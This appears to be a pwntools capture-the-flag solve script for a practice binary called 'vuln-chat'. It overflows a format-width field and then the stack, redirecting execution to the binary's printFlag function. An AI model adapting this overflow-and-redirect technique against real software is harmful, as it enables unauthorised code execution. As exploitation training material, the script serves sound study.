from pwn import *

context.log_level = "debug"

p = process(b"./vuln-chat")
e = ELF(b"./vuln-chat")
r = ROP(e)

printflag_addr = e.symbols["printFlag"]
info(f"printflag_addr: {printflag_addr}")

payload_a = b"A" * 20
payload_a += b"%53s"

payload_b = b"B" * 49
payload_b += p32(printflag_addr)

p.recvuntil(b"username: ")
p.sendline(payload_a)

p.recvuntil(b": ")
p.sendline(payload_b)

p.recvline()
p.recvline()
